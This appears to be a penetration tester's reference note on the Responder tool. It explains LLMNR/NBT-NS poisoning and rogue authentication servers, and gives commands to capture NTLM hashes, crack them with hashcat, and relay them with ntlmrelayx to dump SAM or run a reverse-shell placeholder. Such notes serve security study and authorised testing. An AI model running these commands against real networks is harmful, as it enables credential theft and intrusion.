```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with build in rogue authentication server deployment. The auth servers can be used to steal NTLM & LM hashes, HTTP basic auth etc. Responder will listen on protocol ports and then response on behalf of the servers the victim is looking for and capture their credentials/hashes.

Supports dual IPv6/IPv4 stack.

- *SMB* Auth server supports *NTLMv1*, and *NTLMv2* hashes with Extended Security NTLMSSP. Supports SMBv2 by default.
- *MSSQL* Auth server supports *NTLMv1*, *LMv2* hashes.
- *HTTP(S)* Auth servers supports *NTLMv1*, *NTLMv2* hashes and *Basic Authentication*. HTTPS comes with a dummy set of keys but can generate new PKI pairs.
- *LDAP* Auth server supports *NTLMSSP* and *Simple Auth* (Plaintext authentication)
- *DCE-RPC* Auth server supports *NTLMSSP* hashes
- *FTP* Auth server supports clear text credentials
- *POP3* Auth server supports clear text credentials
- *IMAP* Auth server supports clear text credentials
- *SMTP* Auth server supports clear text credentials
- *DNS* Server will answer `SRV` and `A` queries (useful for ARP spoofing)
- *WPAD* Proxy server can inject HTML into responses for IE clients if configured with `Auto-detect settings` enabled

A Name Resolution (NR) example:
1. A machine tries to get the IP of a file share
2. The local host file is checked first
3. The local DNS cache is checked next
4. The remote DNS will be queried if it still hasn't found the IP
5. Finally, it would try sending a multicast query to all machines on the network requesting the IP address
6. This final step is where responder would answer with its malicious server's address (making the victim falsely trust the malicious server)
> This could happen if a user simply mistyped the share name for instance.
## Installation
Git clone: https://github.com/lgandx/Responder

Any of the rogue servers can be disabled via the config file (`/usr/share/responder/Responder.conf`) if needed.
The tool should also be run as Root for best results as it needs to be able to access ports:
- 137/udp - [[SMB & RPC]]
- 138/udp - [[SMB & RPC]]
- 53/udp - [[DNS]]
- 389/udp+tcp [[LDAP]]
- 1433/tcp [[MSSQL]]
- 1434/udp - 
- 80/tcp
- 135/tcp
- 139/tcp
- 445/tcp
- 21/tcp
- 3141/tcp
- 25/tcp
- 110/tcp
- 587/tcp
- 3128/tcp
- 5355/udp
- 5353/udp
## Documentation
**Cheatsheet:** 
**Website:** https://github.com/lgandx/Responder
## Usage
### Access responder's captured information
Responder writes its captured info to it's logs (stdout & log files). The log files can often be found under `/usr/share/responder/logs` and will write a log file per host. Hashes are also saved to files with the format `[MODULE_NAME]-[HASH_TYPE]-[CLIENT_IP].txt`.

You can also configure a SQLite DB in the config file (`/usr/share/responder/Responder.conf`).

### Default poisoning
```bash
$ python3 Responder.py -I <interface_name>
$ python3 Responder.py -I eth0
```

Hashes are located in the logs `/usr/share/responder/logs/`, we can crack the hashes with `hashcat -m 5600` for `NetNTLMv2`.

We can also perform a hash relay to impersonate the user with the real server. We can use [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).
> Before using these, we need to disable SMB for our responder so we don't intercept our own requests. (`/etc/responder/Responder.conf`)

```bash
# By default it will dump the SAM db
$ impacket-ntlmrelayx --no-http-server -smb2support -t [target_smb_server]

# -c can be added to execute commands - https://www.revshells.com/
$ impacket-ntlmrelayx --no-http-server -smb2support -t [target_smb_server] -c '<example_b64_ps_rev_shell>'
```

### Analyse only mode
This allows us to view NBT-NS, BROWSER, and LLMNR requests without responding
```bash
sudo responder -I <interface> -A
sudo responder --interface <interface> --analyze
```

### Useful Flags

| Flag | Summary                                                                                                     | Use case                                                                                                                                        |
| :--: | ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
|  -A  | Analysis mode, will display if any NBT-NS, BROWSER, and LLMNR requests are being made but won't poison them | Useful if we want to remain passive on the network and not disrupt the flow of traffic                                                          |
|  -w  | Will start the [WPAD](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol) proxy server         | If a browser has Auto-detect settings enabled, then this proxy server will capture all HTTP requests sent by the browsers (good for large orgs) |
|  -f  | Attempt to fingerprint the remote host's OS & version                                                       | Useful for identifying host system information                                                                                                  |
